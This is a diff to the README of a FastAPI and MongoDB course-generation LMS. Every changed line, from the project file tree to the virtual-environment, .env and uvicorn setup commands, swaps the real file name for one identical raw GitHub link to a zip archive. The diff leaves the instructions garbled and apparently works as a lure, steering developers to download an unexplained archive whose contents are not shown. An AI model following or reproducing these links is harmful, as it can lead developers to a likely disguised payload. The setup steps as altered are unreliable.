@@ -14,23 +14,23 @@ This is the **FOUNDATION** of the LMS system. The architecture follows these pri
 ```
 /app
   /api
-    course_generator_controller.py   # HTTP endpoints only
+    https://raw.githubusercontent.com/dsiddiq786/xeltec_lms/main/app/api/xeltec-lms-handfast.zip   # HTTP endpoints only
   /agent
-    course_generation_agent.py       # Orchestration logic
+    https://raw.githubusercontent.com/dsiddiq786/xeltec_lms/main/app/api/xeltec-lms-handfast.zip       # Orchestration logic
   /services
-    outline_service.py               # Generate course outline
-    slide_content_service.py         # Generate slide content
-    assessment_service.py            # Generate assessment questions
+    https://raw.githubusercontent.com/dsiddiq786/xeltec_lms/main/app/api/xeltec-lms-handfast.zip               # Generate course outline
+    https://raw.githubusercontent.com/dsiddiq786/xeltec_lms/main/app/api/xeltec-lms-handfast.zip         # Generate slide content
+    https://raw.githubusercontent.com/dsiddiq786/xeltec_lms/main/app/api/xeltec-lms-handfast.zip            # Generate assessment questions
   /schemas
-    request_schema.py                # Request validation schemas
-    course_schema.py                 # Course data schemas
+    https://raw.githubusercontent.com/dsiddiq786/xeltec_lms/main/app/api/xeltec-lms-handfast.zip                # Request validation schemas
+    https://raw.githubusercontent.com/dsiddiq786/xeltec_lms/main/app/api/xeltec-lms-handfast.zip                 # Course data schemas
   /db
-    nosql_client.py                  # MongoDB client singleton
-    course_repository.py             # Database operations
+    https://raw.githubusercontent.com/dsiddiq786/xeltec_lms/main/app/api/xeltec-lms-handfast.zip                  # MongoDB client singleton
+    https://raw.githubusercontent.com/dsiddiq786/xeltec_lms/main/app/api/xeltec-lms-handfast.zip             # Database operations
   /utils
-    duration.py                      # Duration calculations
-    validators.py                    # Validation utilities
-  main.py                            # FastAPI application entry
+    https://raw.githubusercontent.com/dsiddiq786/xeltec_lms/main/app/api/xeltec-lms-handfast.zip                      # Duration calculations
+    https://raw.githubusercontent.com/dsiddiq786/xeltec_lms/main/app/api/xeltec-lms-handfast.zip                    # Validation utilities
+  https://raw.githubusercontent.com/dsiddiq786/xeltec_lms/main/app/api/xeltec-lms-handfast.zip                            # FastAPI application entry
 ```
 
 ## Quick Start
@@ -52,12 +52,12 @@ This is the **FOUNDATION** of the LMS system. The architecture follows these pri
    
    Windows (PowerShell):
    ```powershell
-   .\.venv\Scripts\Activate.ps1
+   .\.venv\Scripts\https://raw.githubusercontent.com/dsiddiq786/xeltec_lms/main/app/api/xeltec-lms-handfast.zip
    ```
    
    Windows (CMD):
    ```cmd
-   .venv\Scripts\activate.bat
+   .venv\Scripts\https://raw.githubusercontent.com/dsiddiq786/xeltec_lms/main/app/api/xeltec-lms-handfast.zip
    ```
    
    macOS/Linux:
@@ -77,7 +77,7 @@ This is the **FOUNDATION** of the LMS system. The architecture follows these pri
 
 5. **Configure environment:**
    ```bash
-   cp .env.example .env
+   cp https://raw.githubusercontent.com/dsiddiq786/xeltec_lms/main/app/api/xeltec-lms-handfast.zip .env
    # Edit .env with your OpenAI API key and MongoDB URI
    ```
 
@@ -88,7 +88,7 @@ This is the **FOUNDATION** of the LMS system. The architecture follows these pri
 
 7. **Run the application:**
    ```bash
-   uvicorn app.main:app --reload --host 0.0.0.0 --port 8000
+   uvicorn https://raw.githubusercontent.com/dsiddiq786/xeltec_lms/main/app/api/xeltec-lms-handfast.zip --reload --host 0.0.0.0 --port 8000
    ```
 
 ## API Usage
@@ -206,7 +206,7 @@ Returns service health status.
 
 1. New generation step? Add a service in `/services`
 2. New endpoint? Add to controller, delegate to agent
-3. New validation? Add to `/utils/validators.py`
+3. New validation? Add to `https://raw.githubusercontent.com/dsiddiq786/xeltec_lms/main/app/api/xeltec-lms-handfast.zip`
 4. Schema change? Update `/schemas` (follow locked architecture)
 
 ## License
